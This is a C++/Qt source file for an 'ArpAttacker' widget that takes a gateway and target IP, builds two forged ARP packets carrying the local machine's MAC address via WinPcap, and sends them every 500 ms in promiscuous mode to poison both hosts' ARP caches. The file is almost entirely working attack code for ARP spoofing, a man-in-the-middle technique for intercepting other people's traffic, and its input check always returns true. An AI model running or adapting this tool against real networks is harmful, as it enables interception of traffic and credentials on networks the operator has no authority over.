#include "arpattacker.h"
#include "ui_arpattacker.h"

ArpAttacker::ArpAttacker(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::ArpAttacker)
{

//    this->moveToThread(workThread);
    ui->setupUi(this);
}

ArpAttacker::~ArpAttacker()
{
    delete ui;
}

void ArpAttacker::on_startButton_clicked()
{
    if(!checkInput()){
        QMessageBox::warning(this,"waring","input correct ip",QMessageBox::Yes);
        return ;
    }
    gatewayIP[0]=ui->gip1->text().toInt();
    gatewayIP[1]=ui->gip2->text().toInt();
    gatewayIP[2]=ui->gip3->text().toInt();
    gatewayIP[3]=ui->gip4->text().toInt();
    targetIP[0]=ui->tip1->text().toInt();
    targetIP[1]=ui->tip2->text().toInt();
    targetIP[2]=ui->tip3->text().toInt();
    targetIP[3]=ui->tip4->text().toInt();
    qDebug()<<"start attack";
    p1=new ArpPacket(myMAC,gatewayIP,targetIP);
    p2=new ArpPacket(myMAC,targetIP,gatewayIP);
//    workThread=new QThread;
//    workThread->setObjectName("Arp Attacker Thread");
//    this->moveToThread(workThread);
//    startAttack();
     QFuture<void> future = QtConcurrent::run(this,&ArpAttacker::startAttack);
}

void ArpAttacker::startAttack()
{
    pcap_t *openedAdapter;
    char errbuf[255];
    //open device
    if (( openedAdapter= pcap_open(chosenAdapter->name,  // 设备名
        65536,		// 要捕捉的数据包的部分
                    // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
        PCAP_OPENFLAG_PROMISCUOUS,      // 混杂模式
        1000,      // 读取超时时间
        NULL,      // 远程机器验证
        errbuf
        )) == NULL)
    {
        qDebug("\nUnable to open the adapter %s is not supported by WinPcap\n", chosenAdapter->name);
        return;
    }
    while(isContinue){

        /* Print the packet */
        for (int i=1; i < 60-16 + 1; i+=16)
        {
            qDebug("%.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x "
                    ,p1->d[i-1],    p1->d[i],   p1->d[i+1], p1->d[i+2]
                    ,p1->d[i+3],    p1->d[i+4], p1->d[i+5], p1->d[i+6]
                    ,p1->d[i+7],    p1->d[i+8], p1->d[i+9], p1->d[i+10]
                    ,p1->d[i+11],   p1->d[i+12],p1->d[i+13],p1->d[i+14]);
        }
        /* Print the packet */
        for (int i=1; i < 60-16 + 1; i+=16)
        {
            qDebug("%.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x "
                    ,p2->d[i-1],    p2->d[i],   p2->d[i+1], p2->d[i+2]
                    ,p2->d[i+3],    p2->d[i+4], p2->d[i+5], p2->d[i+6]
                    ,p2->d[i+7],    p2->d[i+8], p2->d[i+9], p2->d[i+10]
                    ,p2->d[i+11],   p2->d[i+12],p2->d[i+13],p2->d[i+14]);
        }
        if (pcap_sendpacket(openedAdapter, p1->d, 60*sizeof(u_char)) == -1) {
            qDebug("\npacket 1 sending error");

        }

        if (pcap_sendpacket(openedAdapter, p2->d, 60*sizeof(u_char))==-1) {
            qDebug("\npacket 2 sending error");
        }
        qDebug()<<"arp sleep 500ms";
//        this->thread()->currentThread()->sleep(1);
        this->thread()->currentThread()->msleep(500);
    }
}

void ArpAttacker::setAdapter(pcap_if_t *t)
{
    chosenAdapter=t;
    getSelfInfo();
}

void ArpAttacker::onStop()
{
    isContinue=false;
    delete p1;
    delete p2;
}

bool ArpAttacker::checkInput()
{

    return true;
}
bool ArpAttacker::getSelfInfo()
{
    qDebug()<<inet_ntoa(((struct sockaddr_in *)chosenAdapter->addresses)->sin_addr);

    PCHAR AdapterName=chosenAdapter->name+8;//skip  "rpcap:\\"
    LPADAPTER lpAdapter = PacketOpenAdapter(AdapterName);
    if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
    {
        qDebug("#Error#-%d\n", GetLastError());
        return FALSE;
    }

    PPACKET_OID_DATA pOidData = (PPACKET_OID_DATA)malloc(sizeof(PACKET_OID_DATA) + MAC_LEN);
    // 查看结构体定义，结合MAC地址的长度，便可知道'+6'的含义
    if (pOidData == NULL)
    {
        PacketCloseAdapter(lpAdapter);
        return FALSE;
    }

    // Retrieve the adapter MAC querying the NIC driver
    pOidData->Oid = OID_802_3_CURRENT_ADDRESS; // 获取 MAC 地址
    pOidData->Length = MAC_LEN;
    memset(pOidData->Data, 0, MAC_LEN);

    BOOLEAN bOk = PacketRequest(lpAdapter, FALSE, pOidData);
    if (bOk)
    {
        memcpy(myMAC, pOidData->Data, MAC_LEN);
    }
    qDebug()<<QString("mac %1.%2.%3.%4.%5.%6")
              .arg(myMAC[0],2,16,QChar('0'))
              .arg(myMAC[1],2,16,QChar('0'))
              .arg(myMAC[2],2,16,QChar('0'))
              .arg(myMAC[3],2,16,QChar('0'))
              .arg(myMAC[4],2,16,QChar('0'))
              .arg(myMAC[5],2,16,QChar('0'));
    free(pOidData);
    PacketCloseAdapter(lpAdapter);
    return bOk;
}



